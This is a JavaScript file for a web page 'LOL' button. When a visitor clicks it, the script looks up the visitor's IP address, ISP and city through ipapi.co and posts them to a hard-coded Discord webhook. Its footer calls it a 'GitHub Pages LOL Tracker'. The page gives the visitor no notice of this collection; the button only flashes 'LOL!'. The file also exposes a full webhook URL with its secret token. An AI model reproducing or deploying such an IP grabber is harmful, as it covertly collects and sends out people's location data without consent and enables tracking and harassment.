// Get the button element
const button = document.getElementById('lolButton');

// PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW
const webhookUrl = "https://discord.com/api/webhooks/1475505677546946652/VXzA9a4hBa3nOs8AsanQBxW2itixFYNCnpKAZwNXKvVYr9ug4fSvlzLvRiMklimQjSwl";

// Add click event listener
button.addEventListener('click', () => {
    
    // Optional: Change button text temporarily to show it's working
    const originalText = button.innerText;
    button.innerText = "...";

    // 1. Get the Network Info
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const networkName = data.org || "Unknown Network";
            const ip = data.ip;
            const city = data.city;

            // 2. Create the payload that says "LOL"
            const payload = {
                username: "LOL Button",
                embeds: [
                    {
                        title: "LOL",
                        description: "Someone pressed the button!",
                        color: 16711740, // Red color in decimal
                        fields: [
                            {
                                name: "Network / ISP",
                                value: networkName,
                                inline: true
                            },
                            {
                                name: "IP Address",
                                value: ip,
                                inline: true
                            },
                            {
                                name: "City",
                                value: city,
                                inline: true
                            }
                        ],
                        footer: {
                            text: "GitHub Pages LOL Tracker"
                        }
                    }
                ]
            };

            // 3. Send to Webhook
            return fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
        })
        .then(response => {
            console.log("Sent!");
            // Change button to show success
            button.innerText = "LOL!";
            // Reset button after 2 seconds
            setTimeout(() => {
                button.innerText = originalText;
            }, 2000);
        })
        .catch(error => {
            console.error('Error:', error);
            button.innerText = "Error";
        });
});
